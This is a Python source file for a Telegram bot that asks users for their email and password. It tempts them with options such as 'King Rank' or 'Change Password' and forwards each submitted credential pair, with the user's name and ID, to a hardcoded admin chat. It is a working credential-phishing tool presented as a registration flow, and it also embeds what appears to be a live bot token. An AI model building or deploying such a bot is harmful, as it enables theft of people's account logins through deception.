import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

EMAIL_ID, PASSWORD, CATEGORY = range(3)
ADMIN_CHAT_ID = 8353678671

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome! Please enter your EMAIL ID:",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )
    return EMAIL_ID

async def get_email_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['email_id'] = update.message.text
    await update.message.reply_text("Great! Now, please enter your Password:", parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['password'] = update.message.text
    
    keyboard = [
        [InlineKeyboardButton("King Rank", callback_data="King Rank")],
        [InlineKeyboardButton("Change Password", callback_data="Change Password")],
        [InlineKeyboardButton("Change Email", callback_data="Change Email")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Please select your category using the buttons below:",
        reply_markup=reply_markup
    )
    return CATEGORY

async def select_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    category = query.data
    context.user_data['category'] = category
    
    email_id = context.user_data.get('email_id')
    password = context.user_data.get('password')
    
    message_text = (
        f"New Submission Received!\n\n"
        f"User: {user.full_name} (@{user.username if user.username else 'No username'})\n"
        f"User ID: {user.id}\n"
        f"Email ID: {email_id}\n"
        f"Password: {password}\n"
        f"Selection: {category}"
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message_text,
            parse_mode="Markdown"
        )
        print("SUCCESS: Admin ko message bhej diya gaya hai!")
    except Exception as e:
        print(f"ERROR: {e}")
        
    await query.edit_message_text(
        text=f"Registration Complete!\n\n"
             f"Email ID: {email_id}\n"
             f"Password: {password}\n"
             f"Selected Option: {category}\n\n"
             f"Thank you!"
    )
    
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Operation cancelled. Send /start to begin again.",
        reply_markup=ReplyKeyboardRemove()
    )
    context.user_data.clear()
    return ConversationHandler.END

def main():
    TOKEN = "8786179263:AAGNkrqkddJ1Kwt3Yf7u9yf_WnzBs5XjVwQ"
    application = ApplicationBuilder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            EMAIL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email_id)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            CATEGORY: [CallbackQueryHandler(select_category)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == "__main__":
    main()
